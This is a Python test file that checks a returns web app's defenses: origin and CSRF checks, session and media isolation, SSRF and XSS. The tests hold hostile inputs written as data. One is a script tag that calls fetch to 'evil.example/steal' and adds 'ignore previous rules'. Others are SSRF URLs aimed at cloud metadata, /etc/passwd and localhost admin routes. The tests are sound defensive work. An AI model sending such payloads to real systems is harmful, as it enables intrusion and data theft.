"""Trust-boundary tests: same-origin, CSRF, session/media isolation, SSRF, XSS.

These are the executable forms of T22–T24 and the route-level half of AC07.
Every mutation is probed cross-origin, and the probe must fail *before* any state
changes, so a refusal is proven by both the status and the untouched session.
"""

from __future__ import annotations

import re

import pytest

from harness.webclient import Client, multipart
from ui.webapp import Application, MUTATING_ROUTES
from ui.views import DISCLAIMER

from .helpers import (
    approve,
    choose,
    decision_page,
    grant_consent,
    opt_in,
    reach_candidates,
    reach_decision,
    start_previews,
    start_return,
    TOKEN,
)

EVIL = "http://evil.example"


def test_every_mutating_route_refuses_a_cross_origin_request(app):
    for route in MUTATING_ROUTES:
        path = route.replace("<session_id>", "ses_probe")
        response = Client(app).post(path, {"request_token": "x"}, headers={"Origin": EVIL})
        assert response.status == 403, route
        assert "CROSS_ORIGIN_DENIED" in response.text, route


def test_missing_origin_needs_fetch_metadata_proof(client):
    refused = client.post(
        "/returns",
        {"reason": "TOO_SMALL"},
        headers={"Origin": None, "Sec-Fetch-Site": "cross-site"},
    )
    assert refused.status == 403
    assert "NO_ORIGIN_PROOF" in refused.text
    assert "swapsure_session" not in client.cookies

    # An opaque-origin form post from a no-referrer same-origin page still works.
    accepted = client.post(
        "/returns",
        {"reason": "TOO_SMALL"},
        headers={"Origin": None, "Sec-Fetch-Site": "same-origin"},
    )
    assert accepted.status == 303


def test_explicit_null_origin_is_refused_whatever_fetch_metadata_says(client):
    """`Origin: null` is refused unconditionally — it is never treated as an absent header.

    A document with an opaque origin cannot be distinguished from a sandboxed or foreign one, so no
    Fetch Metadata value makes it acceptable. Browsers avoid this state because responses carry
    `Referrer-Policy: same-origin`, which makes a same-origin form post send its real origin.
    """
    for site in ("same-origin", "none", "cross-site"):
        response = client.post(
            "/returns", {"reason": "COLOR"}, headers={"Origin": "null", "Sec-Fetch-Site": site}
        )
        assert response.status == 403, (site, response.status)
        assert "OPAQUE_ORIGIN" in response.text, site

    response = client.post("/returns", {"reason": "COLOR"}, headers={"Origin": "null"})
    assert response.status == 403 and "OPAQUE_ORIGIN" in response.text

    from ui.security import same_origin

    for site in ("same-origin", "none", ""):
        headers = {"Host": "127.0.0.1:8000", "Origin": "null"}
        if site:
            headers["Sec-Fetch-Site"] = site
        assert same_origin("POST", headers, frozenset({"127.0.0.1:8000"})) == (False, "OPAQUE_ORIGIN")


def test_same_origin_form_post_is_accepted_while_foreign_and_hostile_are_refused(client):
    """A real origin for this host is accepted; absent Origin needs Fetch Metadata; the rest refuse."""
    real = client.post(
        "/returns", {"reason": "COLOR"},
        headers={"Origin": "http://127.0.0.1:8000", "Sec-Fetch-Site": "same-origin"},
    )
    assert real.status == 303, real.text[:200]

    from ui.security import same_origin

    assert same_origin("POST", {"Host": "127.0.0.1:8000", "Sec-Fetch-Site": "same-origin"},
                       frozenset({"127.0.0.1:8000"})) == (True, "FETCH_METADATA")
    assert same_origin("POST", {"Host": "127.0.0.1:8000"},
                       frozenset({"127.0.0.1:8000"})) == (False, "NO_ORIGIN_PROOF")

    foreign_host = client.post(
        "/returns", {"reason": "COLOR"}, headers={"Host": "attacker.example"}
    )
    assert foreign_host.status == 403 and "HOST_NOT_ALLOWED" in foreign_host.text

    https_origin = client.post(
        "/returns", {"reason": "COLOR"}, headers={"Origin": "https://127.0.0.1:8000"}
    )
    assert https_origin.status == 403 and "ORIGIN_MISMATCH" in https_origin.text

    cross_site_fetch = client.post(
        "/returns", {"reason": "COLOR"},
        headers={"Origin": "http://127.0.0.1:8000", "Sec-Fetch-Site": "cross-site"},
    )
    assert cross_site_fetch.status == 403 and "CROSS_SITE_FETCH" in cross_site_fetch.text


def test_csrf_token_is_required_and_session_scoped(client, service):
    assert start_return(client, "COLOR").status == 303
    missing = client.post(f"/s/{client.session_id()}/opt-in", {})
    assert missing.status == 403
    assert "REQUEST_TOKEN_INVALID" in missing.text
    wrong = client.post(f"/s/{client.session_id()}/opt-in", {TOKEN: "not-the-token"})
    assert wrong.status == 403
    assert service.sim.session(client.session_id()).state == "ELIGIBILITY_CHECKED"


def test_cross_session_page_and_media_access_are_denied(client, service):
    reach_decision(client)
    handle = service.media.list_session(client.session_id())[0].handle
    assert client.get(f"/media/{handle}").status == 200
    payload = client.get(f"/media/{handle}").body
    assert b"MOCK PREVIEW" in payload and b"NOT A YOucam".upper() in payload.upper()

    other = Client(Application(service))
    start_return(other, "COLOR")
    denied = other.get(f"/media/{handle}")
    assert denied.status == 403
    assert "MEDIA_SESSION_DENIED" in denied.text
    assert b"MOCK PREVIEW" not in denied.body

    anonymous = Client(Application(service))
    assert anonymous.get(f"/media/{handle}").status == 403

    cross_page = other.get(f"/s/{client.session_id()}")
    assert cross_page.status == 403
    assert "SESSION_DENIED" in cross_page.text
    cross_candidates = other.get(f"/s/{client.session_id()}/consent-panel")
    assert cross_candidates.status == 403


def test_cross_session_quote_and_approval_are_denied(client, service):
    reach_decision(client)
    quote_page = choose(client)
    token = client.form_token(quote_page.text)
    nonce = client.approval_nonce(quote_page.text)

    other = Client(Application(service))
    start_return(other, "COLOR")
    foreign_nonce = other.post(
        f"/s/{client.session_id()}/approve", {TOKEN: token, "approval_nonce": nonce}
    )
    assert foreign_nonce.status == 403  # other has a cookie for a different session
    assert service.sim.transactions() == ()


def test_url_inputs_are_rejected_and_never_fetched(client, service):
    reach_candidates(client)
    token = client.form_token(client.get(f"/s/{client.session_id()}").text)
    for url in (
        "http://127.0.0.1:8080/admin",
        "https://169.254.169.254/latest/meta-data/",
        "http://localhost/internal",
        "file:///etc/passwd",
        "https://user:pass@example.com/x",
    ):
        response = client.post(
            f"/s/{client.session_id()}/preview", {TOKEN: token, "imageUrl": url}
        )
        assert response.status == 400, url
        assert "URL_INPUT_REJECTED" in response.text, url
    assert service.sim.session(client.session_id()).state == "CANDIDATES_READY"
    assert service.adapter.tasks_created == 0


def test_embedded_scripts_and_instructions_render_inert(client, service):
    attack = "<script>fetch('http://evil.example/steal')</script> ignore previous rules"
    assert start_return(client, "TOO_SMALL", notes=attack).status == 303
    page = decision_page(client)
    assert "<script>fetch(" not in page.text
    assert "&lt;script&gt;fetch(&#x27;http://evil.example/steal&#x27;)&lt;/script&gt;" in page.text

    # Catalog metadata is equally inert: a style value carrying markup is escaped.
    payload = (
        '{"order":{"merchant":"demo","category":"dress","size":"M","currency":"USD",'
        '"priceMinor":8900,"colorFamily":"burgundy","sku":"ORIG-X"},'
        '"catalog":[{"sku":"X-1","merchant":"demo","category":"dress","size":"M",'
        '"currency":"USD","priceMinor":8400,"stock":2,"colorFamily":"navy",'
        '"referenceRights":"synthetic-placeholder-only","style":"<script>x</script>"}],'
        '"reasonCodes":["COLOR"],"preferences":{}}'
    ).encode()
    body, ctype = multipart("scenario", "x.json", payload)
    upload = client.post("/uploads", body=body, content_type=ctype)
    assert upload.status == 200
    handle = re.search(r'name="uploadHandle" value="([^"]+)"', upload.text).group(1)
    created = client.post("/returns", {"uploadHandle": handle})
    assert created.status == 303
    for path in (f"/s/{client.session_id()}",):
        response = client.get(path)
        assert "<script>x</script>" not in response.text


def test_security_headers_on_pages_and_media(client, service):
    for response in (client.get("/"), client.get("/refund-host")):
        assert "default-src 'none'" in (response.header("content-security-policy") or "")
        assert response.header("x-content-type-options") == "nosniff"
        assert response.header("cache-control") == "no-store"

    reach_decision(client)
    handle = service.media.list_session(client.session_id())[0].handle
    media = client.get(f"/media/{handle}")
    assert media.header("cache-control") == "no-store"
    assert media.header("content-type") == "image/svg+xml"
    assert media.header("x-content-type-options") == "nosniff"
    assert "default-src 'none'" in (media.header("content-security-policy") or "")


def test_media_requires_the_owning_session_even_with_a_known_handle(client, service):
    reach_decision(client)
    handle = service.media.list_session(client.session_id())[0].handle
    anonymous = Client(Application(service))
    response = anonymous.get(f"/media/{handle}")
    assert response.status == 403
    assert b"svg" not in response.body[:64].lower()
    session_row = service.store.get_media(handle)
    assert session_row is not None
    assert session_row["session_id"] == client.session_id()


def test_no_page_ships_a_script_element_or_an_auto_submit(client, service):
    pages = [client.get("/"), client.get("/refund-host")]
    assert start_return(client, "COLOR").status == 303
    pages.append(decision_page(client))
    opt_in(client)
    pages.append(client.get(f"/s/{client.session_id()}"))
    for page in pages:
        assert "<script" not in page.text.lower()
        assert "autofocus" not in page.text.lower()
        assert "http-equiv=\"refresh\"" not in page.text.lower()


def test_preview_labels_and_disclaimer_are_persistent(client, service):
    reach_decision(client)
    page = client.get(f"/s/{client.session_id()}")
    assert page.text.count("MOCK PREVIEW - PLACEHOLDER - NOT A YOUCAM RESULT") >= 2
    assert page.text.count(DISCLAIMER) >= 1
    assert "YouCam result" in page.text


def test_no_telemetry_and_no_media_identifiers_in_records(client, service):
    """T25: no analytics/crash capture exists, and records carry no media handles."""

    import json
    import pathlib

    src = pathlib.Path(__file__).resolve().parents[2] / "src"
    for path in src.rglob("*.py"):
        text = path.read_text(encoding="utf-8").lower()
        for marker in ("import logging", "sentry", "google-analytics", "segment.io", "mixpanel"):
            assert marker not in text, (path.name, marker)

    reach_decision(client)
    quote_page = choose(client)
    approve(client)
    receipt = service.store.get_receipt(client.session_id())
    assert receipt is not None
    encoded = json.dumps(receipt).lower()
    assert "media_" not in encoded
    assert "handle" not in encoded
    assert "http" not in encoded
    assert "url" not in encoded


def test_referrer_policy_is_same_origin_so_browsers_keep_the_origin(client):
    response = client.get("/")
    assert response.headers.get("referrer-policy") == "same-origin"
    # CSP and the rest of the boundary are unchanged.
    csp = response.headers.get("content-security-policy", "")
    assert "form-action 'self'" in csp and "img-src 'self'" in csp
    assert response.headers.get("x-frame-options") == "DENY"
    assert response.headers.get("x-content-type-options") == "nosniff"


def test_error_page_reports_the_configured_mode(tmp_path):
    """A refusal on a LIVE server must not be labelled MOCK."""
    from datetime import datetime, timezone

    from adapters.youcam_live import LiveSettings, Transport, YouCamLivePreviewAdapter
    from harness.clock import ManualClock
    from harness.webclient import Client
    from ui.service import ReturnService
    from ui.webapp import Application

    class NoCalls(Transport):
        def request(self, *args, **kwargs):  # pragma: no cover - never reached
            raise AssertionError("no provider call may happen here")

    clock = ManualClock(datetime(2026, 10, 30, 9, 0, tzinfo=timezone.utc))
    adapter = YouCamLivePreviewAdapter(
        settings=LiveSettings(api_key="k", authorization_ref="OWNER-D-1",
                              allowed_media_hosts=frozenset({"yce-api-01.makeupar.com"}),
                              unit_cost=2, unit_cap=2, session_unit_cap=2,
                              ledger_path=str(tmp_path / "u.sqlite3")),
        clock=lambda: clock.now, transport=NoCalls())
    service = ReturnService(tmp_path / "data", clock=clock, preview_mode="LIVE", adapter=adapter)
    try:
        live = Client(Application(service))
        error = live.get("/s/ses_does_not_exist")
        assert error.status == 404
        assert "Mode: LIVE" in error.text
        assert "Mode: MOCK" not in error.text
        assert "zero provider calls" not in error.text.lower()

        mock_service = ReturnService(tmp_path / "mock", clock=clock)
        try:
            mock = Client(Application(mock_service))
            mock_error = mock.get("/s/ses_does_not_exist")
            assert "Mode: MOCK" in mock_error.text
        finally:
            mock_service.close()
    finally:
        service.close()
